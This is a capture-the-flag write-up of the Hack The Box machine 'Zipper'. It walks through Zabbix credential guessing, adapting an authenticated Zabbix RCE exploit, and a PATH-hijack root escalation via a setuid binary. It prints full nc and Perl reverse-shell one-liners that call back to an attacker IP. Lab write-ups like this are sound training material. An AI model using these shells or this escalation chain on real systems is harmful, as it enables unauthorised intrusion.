### Quick Summary 
#### Hey guys today Zipper retired and here's my write-up. Owning user on this box was challenging because we have to exploit an RCE vulnerability which is not really easy and then we have to get a stable shell to be able to enumerate, for the privilege escalation it was easy but I also liked it because it was a binary exploitation. It was a very fun box and I liked it. It's a linux box and its ip is `10.10.10.108` , I added it to `/etc/hosts` as `zipper.htb`. Let's jump right in.

### Nmap 
#### As always we will start with nmap to scan for open ports and services :
`nmap -sV -sT -sC zipper.htb`
![](/images/hackthebox/zipper/1.png)
#### We only get 2 ports , http on port 80 and ssh on port 22. so we are going to check http
<br>
<hr>
### HTTP enumeration 
#### By visiting `zipper.htb` we get the default apache2 page :
![](/images/hackthebox/zipper/2.png)
#### So I'm going to run `gobuster` with `directory-list-2.3-medium.txt` to see if there are any sub directories : 
`gobuster -u http://zipper.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
#### Output :
```

/zabbix (Status: 301)
```
#### We got `/zabbix` , let's look at that in the browser : 
![](/images/hackthebox/zipper/3.png)
#### We get this login page , we don't have credentials but down there there's an option to sign in as a guest , but before we do that let's get an idea about `zabbix`

>Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual machines and cloud services. Zabbix provides monitoring metrics, among others network utilization, CPU load and disk space consumption. -[Wikipedia](https://en.wikipedia.org/wiki/Zabbix)
<br>

#### So basically it's a server monitoring tool , let's login as a guest and see what we can get 
![](/images/hackthebox/zipper/4.png)
#### We get this dashboard , but we are not privileged to do anything because we are `guest`
#### After some enumeration we will notice in : Monitoring --> Latest data , `Zapper's Backup Script`
![](/images/hackthebox/zipper/5.png)
#### Now we have a potential username :  `zapper` , we can try to brute force or fuzz the password , but a quick guess worked for me , the username is the password `zapper : zapper` 
![](/images/hackthebox/zipper/6.png)
<br>
<br>
![](/images/hackthebox/zipper/7.png)
#### `GUI access disabled` , on exploit-db there's an authenticated remote code execution exploit for an old version of zabbix , check it [here](https://www.exploit-db.com/exploits/39937) , Unfortunately valid credentials are not enough to exploit it , if we take a look here :
![](/images/hackthebox/zipper/8.png)
#### We also need `hostid` , and to get that we need to get GUI access
<br>
<hr>
### GUI access through zabbix-cli
#### There's a cli tool for zabbix on [github](https://github.com/usit-gd/zabbix-cli) , we can use it to gain GUI access. Installation and configuration is simple you will get the source from github then install it with `install.py install` then you will create a `conf` file for it by executing `zabbix-cli --config`, it will be saved in  `$HOME/.zabbix-cli/zabbix-cli.conf` , open the `conf` file and in Zabbix API section add this line `zabbix_api_url=http://10.10.10.108/zabbix`. For details read the documentation [here](https://github.com/usit-gd/zabbix-cli/blob/master/docs/manual.rst#installing-from-source)
#### Then we will run `zabbix-cli` it will ask for a username and a password , we already have them `zapper : zapper`
#### if we executed `show_usergroups` we will see that `zapper` is in a group called `No access to the fronted` and GUI access to that group is disabled
![](/images/hackthebox/zipper/9.png)
#### We will create a new group and call it `guiaccess` and leave GUI access as system default
`create_usergroup`
![](/images/hackthebox/zipper/10.png)
#### Then we will add `zapper` to that group and delete him from `No access to the fronted` 
`add_user_to_usergroup`
![](/images/hackthebox/zipper/11.png)
`remove_user_from_usergroup`
![](/images/hackthebox/zipper/12.png)
#### Now if we try to login again as `zapper` we will get the dashboard :
![](/images/hackthebox/zipper/13.png)
<hr>
### RCE and getting user
#### From Configuration --> Hosts we have 2 hosts and the second one is the availabe one :
![](/images/hackthebox/zipper/14.png)
#### If we click on it we will get an edit page , but we will notice that the `host id` is included in the url as a GET parameter :
![](/images/hackthebox/zipper/15.png)
#### Now we can edit the python exploit and add the host id : `10106` , this is how the basic login info in the script will look like :
![](/images/hackthebox/zipper/16.png)
<br>
<br>
![](/images/hackthebox/zipper/17.png)
#### And we get a decent shell , but this shell executes commands through API requests which is not efficient , so we will get a reverse shell like this :
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1337 >/tmp/f` 
#### I got this shell from [payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
![](/images/hackthebox/zipper/18.png)
<br>
<br>
![](/images/hackthebox/zipper/19.png)
#### Problem is , we will find that we are in a docker container , and that's actually a bad rabbit hole and when I was doing this box for the first time i spent a lot of time trying to escape this docker container , And eventually i found out that this is the wrong server.
![](/images/hackthebox/zipper/20.png)
#### If we take a look at [this page](https://www.zabbix.com/documentation/3.0/manual/api/reference/script/object) from zabbix documentation , this part :
![](/images/hackthebox/zipper/21.png)
#### there's an option called `execute_on` , which has 2 possible values : `0` to execute on zabbix agent , and `1` to execute on zabbix server. We don't have that option included in the exploit so we are using the default option `1` which means we are executing commands on zabbix server. So we will edit the exploit json data and add `"execute_on" : "0"` in those 2 parts :
![](/images/hackthebox/zipper/22.png)
<br>
<br>
![](/images/hackthebox/zipper/23.png)
#### After that we will run the exploit again and now it will run on the right server , however the shell that we used before didn't work and died immediately because the exploit crashed for some reason , I had to comment out the last line which prints the result : `print cmd_exe["result"]["value"]` , but it didn't fix it , so I tried some other shells and the `perl` one worked :
```
perl -e 'use Socket;$i="10.10.xx.xx";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
#### Then I used used `python3` pty to get a proper shell , python2 didn't exist on the server

```
#### First thing we will notice that we are `zabbix` and in `/home` there's a directory for the user `zapper` 
![](/images/hackthebox/zipper/25.png)
#### We can't read `user.txt` and we can't go into `.ssh`
![](/images/hackthebox/zipper/26.png)
#### There's another directory called `utils` which contains 2 files , `backup.sh` and `zabbix-service`
`cat backup.sh`
![](/images/hackthebox/zipper/28.png)
#### We see that it has a hardcoded password in it : `ZippityDoDah` , we can try to `su` to zapper with that password
![](/images/hackthebox/zipper/29.png)
#### And it worked , now we can get the ssh key from `.ssh` and have ssh connection
![](/images/hackthebox/zipper/30.png)
<br>
<br>
![](/images/hackthebox/zipper/31.png)
#### And we owned user !
<br>
<hr>
### Privilege Escalation and getting root
#### If we take a look at the `utils` directory again and execute `zabbix-service` :
![](/images/hackthebox/zipper/32.png)
<br>
<br>
![](/images/hackthebox/zipper/33.png)
#### It asks us start or stop? then it executes something and exits , we will check if that binary is a suid binary : 
`find /home/zapper/utils -perm -4000`
![](/images/hackthebox/zipper/34.png)
#### It's a suid binary , we need to know what is it doing. Without reverse engineering , `strings` was enough :
`strings zabbix-service`
![](/images/hackthebox/zipper/35.png)
#### This command is being executed when we type `start` : `systemctl daemon-reload && systemctl start zabbix-agent` , so what are we going to do is the same as we did in [Dab](/hack-the-box/dab/) , the only difference is in dab we hijacked a shared library that the binary used , but here we will hijack a binary. By default `systemctl` points to `/bin/systemctl`
![](/images/hackthebox/zipper/36.png)
#### We will create a `c` program to execute `/bin/bash` :
![](/images/hackthebox/zipper/37.png)
#### Then we will compile it with gcc : `gcc exploit.c -o systemctl`
#### Now we have our fake binary ready : 
![](/images/hackthebox/zipper/38.png)
#### We will add `/home/zapper/utils` as the first entry in `PATH` env variable , so the system will look there first : 
`export PATH=/home/zapper/utils:$PATH`
#### This is changing the `PATH` variable to `/home/zapper/utils:` + the old path 
![](/images/hackthebox/zipper/39.png)
#### Now `systemctl` points to our fake binary , let's run `zabbix-service` :
![](/images/hackthebox/zipper/40.png)
#### And we owned root !
